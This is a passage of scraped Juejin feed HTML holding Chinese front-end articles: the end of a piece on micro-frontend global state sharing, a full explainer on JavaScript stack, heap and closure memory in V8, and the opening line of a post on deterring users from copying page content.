<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleLogin</span> =(<span class="hljs-params"/>)=&gt;{
  <span class="hljs-comment">// 。。。主应用的业务逻辑</span>
  <span class="hljs-comment">// 更新state  </span>
  <span class="hljs-title function_">updateGlobalState</span>({
      <span class="hljs-attr">isLoggedIn</span>: <span class="hljs-literal">true</span>,
    });
}
</code></pre>
<p>在子应用中监听</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// sub-app1/main.js</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">render</span>(<span class="hljs-params">props = {}</span>) {
  <span class="hljs-keyword">const</span> container = props.<span class="hljs-property">container</span> || <span class="hljs-string">'#app'</span>

  instance = <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>)
  
  <span class="hljs-comment">// 监听全局状态变化</span>
  <span class="hljs-comment">//props 里面有setGlobalState和onGlobalStateChange 方法，可用于监听和修改状态 </span>
  <span class="hljs-keyword">if</span> (props.<span class="hljs-property">onGlobalStateChange</span>) {
    props.<span class="hljs-title function_">onGlobalStateChange</span>(<span class="hljs-function">(<span class="hljs-params">state, prev</span>) =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'子变更后的状态'</span>, state, <span class="hljs-string">'子变更前的状态'</span>, prev);
    });
  }
  <span class="hljs-comment">// 挂载一下props，以便于在其他组件中使用setGlobalState和onGlobalStateChange</span>
  <span class="hljs-comment">// 挂载的方式有很多， pinia等，总之其他地方能获取到props对象就行  </span>
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">__SUBAPP__</span> = props
  pinia = <span class="hljs-title function_">createPinia</span>()
  instance.<span class="hljs-title function_">use</span>(pinia)
  instance.<span class="hljs-title function_">mount</span>(container)
}
</code></pre>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ef53aace976646fe93b6b05b904cd7b2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omR5qOx6Ju-5a2Q:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939959&amp;x-signature=lMpZUaJ3pKN%2BYL%2FafoBo4AnlEV4%3D" alt="image-20251209221654305" loading="lazy"/>
<h5 data-id="heading-29">子-&gt;父传递</h5>
<p>在子应用创建的时候，已经将<code>props</code>保存了<code>window.__SUBAPP__ = props</code>,在子应用的任何组件中都可以使用</p>
<p>所以只需要在某个组件中调用<code>setGlobalState</code>方法就可</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// sub-app1/HelloWord.vue</span>
<span class="hljs-comment">// 获取全局状态管理方法</span>
<span class="hljs-keyword">const</span> { setGlobalState } = <span class="hljs-variable language_">window</span>.<span class="hljs-property">__SUBAPP__</span> || {}
<span class="hljs-keyword">if</span> (setGlobalState) {
	<span class="hljs-comment">// 更新全局状态</span>
    <span class="hljs-title function_">setGlobalState</span>({
      <span class="hljs-attr">sharedData</span>: {
        <span class="hljs-attr">count</span>: newValue
      }
    })
}
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3ac73b829329421886daa6636c6fc65d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omR5qOx6Ju-5a2Q:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939959&amp;x-signature=rR5Te%2FS54JZtXWDoHNqktz0iQlo%3D" alt="image-20251209222325435" loading="lazy"/></p>
<h2 data-id="heading-30">微前端选型指南：何时用？用哪个？</h2>
<h3 data-id="heading-31">适合场景 ✅</h3>
<ul>
<li>大型企业级应用（100+页面）</li>
<li>多团队协作开发（3+前端团队）</li>
<li>老系统渐进式重构</li>
<li>需要支持多技术栈</li>
<li>独立部署需求强烈</li>
<li/>
</ul>
<h3 data-id="heading-32">不适合场景 ❌</h3>
<ul>
<li>小型项目（页面&lt;20）</li>
<li>单人/小团队开发</li>
<li>对性能要求极致（首屏加载时间&lt;1s）</li>
<li>无技术栈异构需求</li>
</ul>
<h2 data-id="heading-33">结语</h2>
<p><strong>千万不要手里攥着锤子看啥都像钉子。</strong>
微前端不是银弹，而是一种架构选择。它用复杂度换来了灵活性、独立性和可维护性。就像乐高积木，单个模块简单，但组合起来却能构建出无限可能的世界。</p>
<p>后续有时间将继续深入学习一下微前端的<code>生命周期、样式隔离、部署发布</code>这几个部分。</p>
<p>最后，觉得有用的话三连一下~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入 JavaScript 内存机制：从调用栈到闭包，一文讲透！]]></title>    <link>https://juejin.cn/post/7581750253000687651</link>    <guid>https://juejin.cn/post/7581750253000687651</guid>    <pubDate>2025-12-10T02:52:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581750253000687651" data-draft-id="7581786379803361315" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入 JavaScript 内存机制：从调用栈到闭包，一文讲透！"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2025-12-10T02:52:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="生椰丝绒拿铁"/> <meta itemprop="url" content="https://juejin.cn/user/4185180725584116"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入 JavaScript 内存机制：从调用栈到闭包，一文讲透！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4185180725584116/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    生椰丝绒拿铁
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:52:45.000Z" title="Wed Dec 10 2025 02:52:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在日常开发中，我们写 JavaScript 代码时几乎不需要关心内存分配、回收这些底层细节。但你是否曾好奇过：</p>
<ul>
<li>为什么 <code>let a = 1; let b = a; a = 2</code> 后，<code>b</code> 还是 1？</li>
<li>为什么对象赋值后修改一个会影响另一个？</li>
<li>闭包到底是怎么“记住”外部变量的？</li>
<li>JS 是如何做到“不用手动释放内存”的？</li>
</ul>
<p>今天，我们就结合 V8 引擎的实现原理，深入浅出地聊聊 <strong>JavaScript 的内存机制与执行模型</strong>，揭开这些常见现象背后的真相。</p>
<hr/>
<h2 data-id="heading-0">一、JS 是什么语言？动态弱类型 ≠ 不严谨</h2>
<p>先来看一段代码：</p>
<pre><code class="hljs language-ini" lang="ini">var bar<span class="hljs-comment">;</span>
console.log(typeof bar)<span class="hljs-comment">; // "undefined"</span>
<span class="hljs-attr">bar</span> = <span class="hljs-number">12</span><span class="hljs-comment">;</span>
console.log(typeof bar)<span class="hljs-comment">; // "number"</span>
<span class="hljs-attr">bar</span> = <span class="hljs-string">"极客时间"</span><span class="hljs-comment">;</span>
console.log(typeof bar)<span class="hljs-comment">; // "string"</span>
<span class="hljs-attr">bar</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
console.log(typeof bar)<span class="hljs-comment">; // "boolean"</span>
<span class="hljs-attr">bar</span> = null<span class="hljs-comment">;</span>
console.log(typeof bar)<span class="hljs-comment">; // "object" ← JS 的历史性 bug！</span>
<span class="hljs-attr">bar</span> = {name: <span class="hljs-string">"极客时间"</span>}<span class="hljs-comment">;</span>
console.log(typeof bar)<span class="hljs-comment">; // "object"</span>
</code></pre>
<p>这段代码展示了 JavaScript 的两个关键特性：</p>
<ul>
<li><strong>动态类型</strong>：变量类型在运行时确定，无需提前声明。</li>
<li><strong>弱类型</strong>：不同类型之间可以隐式转换（如 <code>true == 1</code>）。</li>
</ul>
<p>但这并不意味着 JS “不严谨”。恰恰相反，它的设计让开发者更聚焦于逻辑而非类型系统。而这一切的背后，离不开一套精密的 <strong>内存管理机制</strong>。</p>
<hr/>
<h2 data-id="heading-1">二、内存分两块：栈 vs 堆</h2>
<p>JavaScript 引擎（如 V8）将内存分为两类：</p>




















<table><thead><tr><th>内存区域</th><th>存储内容</th><th>特点</th></tr></thead><tbody><tr><td><strong>栈内存（Stack）</strong></td><td>简单数据类型（Number, String, Boolean, undefined, Symbol, BigInt）</td><td>快速分配/释放，连续空间，大小固定</td></tr><tr><td><strong>堆内存（Heap）</strong></td><td>复杂数据类型（Object, Array, Function 等）</td><td>空间大但分配/回收慢，不连续</td></tr></tbody></table>
<h3 data-id="heading-2">✅ 示例 1：基本类型 —— 栈内存中的独立拷贝</h3>
<pre><code class="hljs language-ini" lang="ini">function foo() {
  var <span class="hljs-attr">a</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
  var <span class="hljs-attr">b</span> = a<span class="hljs-comment">; // 拷贝值</span>
  <span class="hljs-attr">a</span> = <span class="hljs-number">2</span><span class="hljs-comment">;</span>
  console.log(a)<span class="hljs-comment">; // 2</span>
  console.log(b)<span class="hljs-comment">; // 1 ← 不受影响</span>
}
</code></pre>
<p>因为 <code>a</code> 和 <code>b</code> 都是基本类型，它们各自在栈中拥有独立的存储空间。赋值是<strong>值拷贝</strong>，互不影响。</p>
<h3 data-id="heading-3">✅ 示例 2：引用类型 —— 堆内存中的共享指针</h3>
<pre><code class="hljs language-css" lang="css">function foo() {
  <span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">a</span> = { name: <span class="hljs-string">"极客时间"</span> };
  <span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">b</span> = <span class="hljs-selector-tag">a</span>; // 拷贝的是“引用”（指针）
  <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.name</span> = '极客帮';
  console<span class="hljs-selector-class">.log</span>(<span class="hljs-selector-tag">a</span>); // { name: <span class="hljs-string">"极客帮"</span> }
  console<span class="hljs-selector-class">.log</span>(<span class="hljs-selector-tag">b</span>); // { name: <span class="hljs-string">"极客帮"</span> } ← 被同步修改！
}
</code></pre>
<p>这里 <code>a</code> 和 <code>b</code> 在栈中只保存了指向堆中同一个对象的<strong>引用地址</strong>。修改对象内容，所有引用都会看到变化。</p>
<blockquote>
<p>💡 <strong>关键理解</strong>：JS 中没有“对象变量”，只有“对象引用”。</p>
</blockquote>
<hr/>
<h2 data-id="heading-4">三、执行上下文与调用栈：程序运行的舞台</h2>
<p>每当 JS 执行一段代码，引擎会创建一个 <strong>执行上下文（Execution Context）</strong> ，包含：</p>
<ul>
<li><strong>变量环境（Variable Environment）</strong> ：存放 <code>var</code>、函数声明等</li>
<li><strong>词法环境（Lexical Environment）</strong> ：存放 <code>let</code>、<code>const</code>、块级作用域等</li>
<li><strong>this 绑定</strong></li>
<li><strong>outer 引用</strong>：指向外层作用域（用于构建作用域链）</li>
</ul>
<p>这些上下文被压入 <strong>调用栈（Call Stack）</strong> —— 一个 LIFO（后进先出）的结构。</p>
<blockquote>
<p>📌 <strong>为什么用栈？</strong><br/>
因为函数调用频繁，栈的“压入/弹出”操作极快，且内存连续，适合快速切换上下文。</p>
</blockquote>
<p>一旦函数执行完毕，其上下文从栈顶弹出，栈内变量（基本类型）<strong>瞬间释放</strong>；而堆中的对象，只有当<strong>没有任何引用指向它</strong>时，才会被垃圾回收器（GC）慢慢清理。</p>
<hr/>
<h2 data-id="heading-5">四、闭包：自由变量的“时光胶囊”</h2>
<p>闭包是 JS 最强大也最易误解的特性之一。看下面这个经典例子：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">var</span> myName = <span class="hljs-string">"极客时间"</span>
    <span class="hljs-keyword">let</span> test1 = <span class="hljs-number">1</span>
    <span class="hljs-keyword">const</span> test2 = <span class="hljs-number">2</span>
    <span class="hljs-keyword">var</span> innerBar = { 
        <span class="hljs-attr">setName</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">newName</span>){
            myName = newName
        },
        <span class="hljs-attr">getName</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"/>){
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(test1)
            <span class="hljs-keyword">return</span> myName
        }
    }
    <span class="hljs-keyword">return</span> innerBar
}
<span class="hljs-keyword">var</span> bar = <span class="hljs-title function_">foo</span>()
bar.<span class="hljs-title function_">setName</span>(<span class="hljs-string">"极客邦"</span>)
bar.<span class="hljs-title function_">getName</span>()
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(bar.<span class="hljs-title function_">getName</span>())
</code></pre>
<h3 data-id="heading-6">闭包是如何工作的？</h3>
<ol>
<li><strong>编译阶段</strong>：V8 扫描 <code>foo</code> 内部函数，发现 <code>getName</code>/<code>setName</code> 引用了 <code>myName</code>。</li>
<li><strong>判断闭包</strong>：只要有内部函数引用了外部变量，就判定存在闭包。</li>
<li><strong>创建 closure 对象</strong>：在<strong>堆内存</strong>中创建一个 <code>closure(foo)</code> 对象，专门保存被引用的自由变量（如 <code>myName</code>）。</li>
<li><strong>内部函数绑定</strong>：<code>getName</code> 和 <code>setName</code> 的 <code>[[Scope]]</code> 指向这个 <code>closure(foo)</code>。</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9fa2db06f5e433984f4b768cce73953~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55Sf5qSw5Lid57uS5ou_6ZOB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939964&amp;x-signature=QecN7u0in2TLLZVtygwG5kGjRkw%3D" alt="d988c42838314c078c1a17b622dade56.png" loading="lazy"/></p>
<blockquote>
<p>🔥 <strong>核心突破</strong>：<br/>
闭包的本质，是<strong>把本该随栈销毁的变量，提升到堆中长期保存</strong>，并通过作用域链维持访问能力。</p>
</blockquote>
<p>这解释了为什么即使 <code>foo()</code> 执行完毕，返回的函数仍能读写 <code>myName</code> —— 它们共享同一个堆中的闭包环境。</p>
<hr/>
<h2 data-id="heading-7">五、对比 C 语言：JS 为何不用手动管理内存？</h2>
<p>看看 C 代码：</p>
<pre><code class="hljs language-ini" lang="ini">int main() {
  int <span class="hljs-attr">a</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
  char* <span class="hljs-attr">b</span> = <span class="hljs-string">"极客时间"</span><span class="hljs-comment">;</span>
  bool <span class="hljs-attr">c</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
  <span class="hljs-attr">c</span> = a<span class="hljs-comment">; // 隐式转换（危险！）</span>
  return 0<span class="hljs-comment">;</span>
}
</code></pre>
<p>C/C++ 需要手动 <code>malloc</code> / <code>free</code>，稍有不慎就会内存泄漏或野指针。而 JS：</p>
<ul>
<li><strong>自动分配</strong>：声明变量时自动决定放栈 or 堆</li>
<li><strong>自动回收</strong>：通过引用计数 + 标记清除算法回收无用对象</li>
<li><strong>开发者无感</strong>：你只需关注逻辑，引擎处理一切</li>
</ul>
<p>当然，这也带来性能权衡：堆操作比栈慢，GC 可能造成卡顿。但对大多数 Web 应用来说，这是值得的抽象。</p>
<hr/>
<h2 data-id="heading-8">六、总结：一张图看懂 JS 内存模型</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02d47040f7c74dadad46116cec8e9df8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55Sf5qSw5Lid57uS5ou_6ZOB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939964&amp;x-signature=MZdTOFhSE5ymBLt%2Fl59VqPHWxeo%3D" alt="f1515078f7c243d6847e9eb9c5bef712.png" loading="lazy"/></p>
<ul>
<li><strong>栈</strong>：轻量、快速、自动释放</li>
<li><strong>堆</strong>：重量、灵活、GC 回收</li>
<li><strong>闭包</strong>：通过堆保存自由变量，打破栈的生命周期限制</li>
</ul>
<hr/>
<h2 data-id="heading-9">七、结语</h2>
<p>理解 JavaScript 的内存机制，不仅能写出更健壮的代码，还能在面试中脱颖而出。<strong>真正的高手，既会写业务，也懂底层原理</strong>。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前端怎么防止用户复制？这10种方法让你的内容更安全]]></title>    <link>https://juejin.cn/post/7581727073582137395</link>    <guid>https://juejin.cn/post/7581727073582137395</guid>    <pubDate>2025-12-10T02:54:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581727073582137395" data-draft-id="7573972055269244966" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="前端怎么防止用户复制？这10种方法让你的内容更安全"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2025-12-10T02:54:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="刘大华"/> <meta itemprop="url" content="https://juejin.cn/user/3507878440995946"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            前端怎么防止用户复制？这10种方法让你的内容更安全
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3507878440995946/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    刘大华
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:54:37.000Z" title="Wed Dec 10 2025 02:54:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是大华！在我们写前端的时候，有时候会遇到这种<strong>禁止用户复杂网页内容</strong>的需求，这里来分享几种常见的方法，但是这些方法也不能完全阻止内容被复制。</p>
